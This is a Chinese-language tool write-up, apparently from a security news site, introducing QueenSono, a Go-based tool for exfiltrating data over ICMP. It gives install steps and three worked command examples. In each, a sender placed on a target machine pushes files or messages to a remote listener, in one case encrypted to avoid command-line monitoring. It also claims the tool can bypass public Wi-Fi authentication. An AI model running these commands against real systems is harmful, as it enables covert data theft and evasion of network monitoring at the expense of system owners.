## 关于QueenSono

QueenSono是一款针对ICMP协议的数据提取工具，该工具基于Golang开发，并且只依赖于ICMP协议不受监控这一事实实现其功能。除此之外，该工具也可以用于基本的ICMP检查，或绕过某些身份验证机制，比如说许多公共Wi-Fi在连接到Wi-Fi（如机场Wi-Fi）后用于对用户进行身份验证。

## 工具安装

### 从源码安装

广大研究人员可以直接使用下列命令将该项目源码克隆至本地，并安装好该工具所需的依赖组件：

    
    
    git clone https://github.com/ariary/QueenSono.git
    
    make before.build

下列命令可以构建ICMP包发送器-qssender：

    
    
    build.queensono-sender

下列命令可以构建ICMP包接收器-qsreceiver：

    
    
    build.queensono-receiver

## 工具使用

ICMP包发送器-qssender将负责把ICMP数据包发送至监听器，因此我们需要将qssender源码传输到目标设备上。

ICMP包接收器-qsreceiver就是我们本地设备上的数据包监听器了。

所有的命令和工具参数都可以使用“--help”来查看。

## 工具使用样例1：发送包携带“ACK”

在这个例子中，我们将发送一个大型文件，并查看接收到数据包之后的回复信息：

![](https://image.3001.net/images/20211009/1633742697_6160ef69bbf554054ae6f.gif)

在本地设备上，运行下列命令：

    
    
    $ qsreceiver receive -l 0.0.0.0 -p -f received_bible.txt

参数解释：

> -l 0.0.0.0：监听所有接口的ICMP数据包
>
> -f received_bible.txt：将接收到的数据存储至文件
>
> -p：显示接收数据的进度条

在目标设备上，运行下列命令：

    
    
    $ wget https://raw.githubusercontent.com/mxw/grmr/master/src/finaltests/bible.txt #download a huge file (for the example)
    
    $ qssender send file -d 2 -l 127.0.0.1 -r 10.0.0.92 -s 50000 bible.txt

参数解释：

> send file：发送文件
>
> -d 2：每两秒发送一个数据包
>
> -l 127.0.0.1：每次接收回复信息的监听地址
>
> -r 10.0.0.92：运行了qsreceiver 监听器的远程设备地址
>
> -s 50000：每个数据包需要发送的数据量大小

## 工具使用样例2：发送包不携带“ACK”

在这个例子中，我们希望在不等待回复信息的情况下发送数据：

![](https://image.3001.net/images/20211009/1633742683_6160ef5b2241a77588766.gif)

在本地设备上，运行下列命令：

    
    
    $ qsreceiver receive truncated 1 -l 0.0.0.0

参数解释：

> receive truncated 1：如果没有收到所有数据包，则不会无限期等待

在目标设备上，运行下列命令：

    
    
    $ qssender send "thisisatest i want to send a string w/o waiting for the echo reply" -d 1 -l 127.0.0.1 -r 10.0.0.190 -s 1 -N

参数解释：

> -N：无回复选项

## 工具使用样例3：发送加密数据

在这个例子中，我们将发送加密消息。由于命令行可能会被监控，因此我们将使用非对称加密（防止密钥泄露）：

![](https://image.3001.net/images/20211009/1633742651_6160ef3b685fba2269cd9.gif)

在本地设备上，运行下列命令：

    
    
    $ qsreceiver receive -l 0.0.0.0 --encrypt
    
    <OUTPUT PUBLIC KEY>

参数解释：

> \--encrypt：使用加密交换，它将生成公钥/私钥。公钥将用于qssender加密数据，私钥将用于接收器解密数据

在目标设备上，运行下列命令：

    
    
    $ export MSG="<your message>"
    
    $ export KEY="<public_key_from_qsreceiver_output>"
    
    $ qssender send $MSG -d 1 -l 127.0.0.1 -r 10.0.0.190 -s 5 --key $KEY

参数解释：

> \--key：提供数据加密的密钥

## 项目地址

 **QueenSono：** 【[ _GitHub传送门_](https://github.com/ariary/QueenSono)】

## 参考资料

> [
> _https://github.com/ariary/QueenSono/tree/main/hack﻿_](https://github.com/ariary/QueenSono/tree/main/hack)

